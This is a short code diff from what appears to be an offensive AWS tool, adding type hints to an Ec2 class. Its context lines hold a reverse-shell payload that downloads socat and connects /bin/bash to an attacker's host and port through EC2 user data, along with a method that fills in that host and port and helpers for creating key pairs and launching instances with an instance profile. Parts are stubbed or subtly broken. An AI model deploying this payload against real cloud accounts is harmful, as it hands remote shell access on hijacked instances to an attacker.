@@ -9,8 +9,8 @@ class Ec2():
         self.user_data_payload = f"curl -o /tmp/socat https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat" \
         " && /tmp/socat tcp4:<rhost>:<rport> exec:/bin/bash"
     
-    def _create_key_pair(self, key_name):
-        def _create(key_name, dry=True):
+    def _create_key_pair(self, key_name: str):
+        def _create(key_name: str, dry=True):
             try:
                 if not dry:
                     self.console.log(f"Creating key pair named `{key_name}`.. ([bold purple]ATTENTION[/bold purple])")
@@ -46,15 +46,15 @@ class Ec2():
             self.console.print("You do not have the required permission to create a key pair ([red]OPERATIONE FAILED[/red])")
 
     def _run_instance(
-        self, key_name, instance_type):
+        self, key_name: str, instance_type: str):
         pass
 
     def launch_ec2_instance_profile(
-        self, key_name, instance_profile_arn):
+        self, key_name: str, instance_profile_arn: str):
         self._create_key_pair(key_name)
         self._run_instance(key_name)
 
-    def user_data_rev_shell(self, rhost, rport):
+    def user_data_rev_shell(self, rhost: str, rport: int):
         self.user_data_payload.replace("<rhost>", rhost)
         self.user_data_payload.replace("<rport>", rport)
 
